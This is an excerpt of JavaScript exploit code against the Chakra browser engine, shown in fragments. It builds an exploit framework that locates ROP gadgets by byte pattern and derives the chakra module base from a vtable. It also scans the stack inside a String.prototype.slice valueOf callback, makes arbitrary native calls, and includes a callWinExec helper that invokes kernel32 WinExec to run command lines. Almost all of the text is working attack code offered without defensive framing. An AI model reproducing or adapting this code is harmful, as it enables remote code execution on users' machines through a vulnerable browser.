...
function BaseExploit(bitness) {
    ...
    function callWinExec(lpCmdLine,uCmdShow)
    {
        return new FunctionType(null).cast(exploit.call(toIntMax(importFunction('kernel32.dll', 'WinExec').address), toIntMax(cString(lpCmdLine)),toIntMax(uCmdShow)));
    }
...
BaseExploit.prototype.findGadgets = function (module, query) {
    ...
    query.forEach((gadget) => {
       ...
       // echo("gadget " + name  + " : 0x" + i32ToHex(module.add(idx).high) + i32ToHex(module.add(idx).low));
...
ChakraExploit.prototype.initChakra = function (vtable) {
	//echo("arr vtable  : 0x" + i32ToHex(vtable.high) + i32ToHex(vtable.low));
    this.chakraBase = this.findModuleBase(vtable);
 	//echo("chakraBase  : 0x" + i32ToHex(this.chakraBase.high) + i32ToHex(this.chakraBase.low));
    var gadgets = [
       ...
       // ['entrySlice', [0x8B, 0xF8, 0x41, 0x83, -1, 0x02]],
        ['entrySlice', [0x4c, 0x8d, 0x05, 0xa6, 0x12, 0x3d, 0x00, 0x45, 0x33, 0xe4]],
    ...
    this.entrySlice = this.gadgets.entrySlice.add(-0x6b);
...
ChakraExploit.prototype.addressOfSlow = function (obj) {
    ...
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            ...
            while (!this.Uint64.cast(this.entrySlice).eq(stk.load())) {
                stk = stk.add(-1);
...
ChakraExploit.prototype.call = function (address, ...args) {
    //echo("address : 0x" + i32ToHex(address.high) + i32ToHex(address.low));
    if (args.length > 10) {
    ...
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            ...
            var entrySlice = this.Uint64.cast(this.entrySlice);
